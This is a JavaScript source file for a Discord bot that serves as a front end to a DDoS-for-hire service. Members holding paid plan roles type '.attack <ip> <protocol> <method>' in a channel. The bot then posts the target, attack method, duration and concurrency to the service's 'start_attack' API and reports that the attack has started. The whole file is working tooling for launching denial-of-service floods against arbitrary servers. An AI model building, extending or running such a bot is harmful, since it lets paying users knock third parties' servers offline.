const http = require("https");
const querystring = require('querystring');

const { Client, Events, GatewayIntentBits, EmbedBuilder  } = require('discord.js');
const { botToken, attackChannelId, plans, mcstormApiToken } = require('./config.json');

function getEmbed(message, ip, protocol, method, tarrif, time, content = "starting") {
	let color = 0xffff00;
	switch(content) {
	case "starting":
		color = 0xffff00;
		break;
	case "started":
		color = 0x00ff00;
		break;
	case "error":
		color = 0xff0000;
	}

	const embed = new EmbedBuilder()
		.setColor(color)
		.setTitle(message)
		.setURL('https://mcstorm.is')
		.addFields(
			{ name: 'IP Address', value: "`"+ip+"`" },
			{ name: 'Protocol', value: "`"+protocol+"`", inline: true },
			{ name: 'Method', value: "`"+method+"`", inline: true },
			{ name: 'Power', value: "`"+tarrif+"`", inline: true },
			{ name: 'Time', value: "`"+time+'s`', inline: true },
		)
		.setImage("https://i.pinimg.com/originals/37/b3/35/37b335163c44284c8750cb9885461952.gif")
		.setTimestamp()
		.setFooter({ text: 'Powered by MCSTORM', iconURL: 'https://mcstorm.is/assets/image/mcstorm-favicon.png' });

	return embed;
}

// mcstorm api
const url = 'https://api.mcstorm.is/start_attack';
const options = {
    method: 'POST',
    headers: {
    	'Content-Type': 'application/x-www-form-urlencoded'
    }
    
};

// Create client with access to messages
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent ] });

// log Ready message to console when the bot is ready
client.once(Events.ClientReady, readyClient => {
	console.log(`Ready! Logged in as ${readyClient.user.tag}`);
});

// message handling
client.on(Events.MessageCreate, msg => {
	// return if the message was not sent in an attack channel
	if(msg.channelId != attackChannelId) {
		return;
	}

	// attack command handling
	if(msg.content.toLowerCase().startsWith(".attack")) {
		let planConfig = {tarrif: null};
		msg.member.roles.cache.forEach(role => {
			plans.forEach(plan => {
				if(role.id == plan.role) {
					planConfig = plan
				}
			})
		})

		// check if the user has permission to attack
		if(planConfig.tarrif == null) {
			msg.reply("You do not have permission to attack.");
			return;
		}

		// check if the user uses the correct syntax
		let parts = msg.content.split(" ");
		if(parts.length != 4) {
			msg.reply("Command usage: `.attack <ip> <protocol> <method>`");
			return;
		}

		// get the attack info from the command
		let ip = parts[1];
		let protocol = parts[2];
		let method = parts[3];

		// send message about starting attack
		msg.reply({embeds: [getEmbed("Preparing attack...", ip, protocol, method, planConfig.tarrif, planConfig.time, "starting")]}).then(infoMessage => {

			// when message is sent, send the API request to mcstorm
			const data = querystring.stringify({
				token: mcstormApiToken,
				ipport: ip,
				protocol: protocol,
				method: method,
				time: planConfig.time,
				network: planConfig.network,
				concurrent: planConfig.concurrent
			});
			let result = '';

			// create the request
			const req = http.request(url, options, (res) => {
			    console.log(res.statusCode);

			    res.setEncoding('utf8');
			    res.on('data', (chunk) => {
			        result += chunk;
			    });

			    res.on('end', () => {
			        // when response comes, edit the message to result from the API call
			        apires = JSON.parse(result);
			        if(apires.status == "error") {
			        	infoMessage.edit({embeds: [getEmbed("API ERROR: "+apires.error, ip, protocol, method, planConfig.tarrif, planConfig.time, "error")]});
			        	return;
			        }
			        infoMessage.edit({embeds: [getEmbed("Attack started successfully", ip, protocol, method, planConfig.tarrif, planConfig.time, "started")]});

			    });
			});

			req.on('error', (e) => {
				// network error message
			    infoMessage.edit("Network error");
			});

			req.write(data);
			req.end();
		})
	}
    
});

// log in to the bot
client.login(botToken);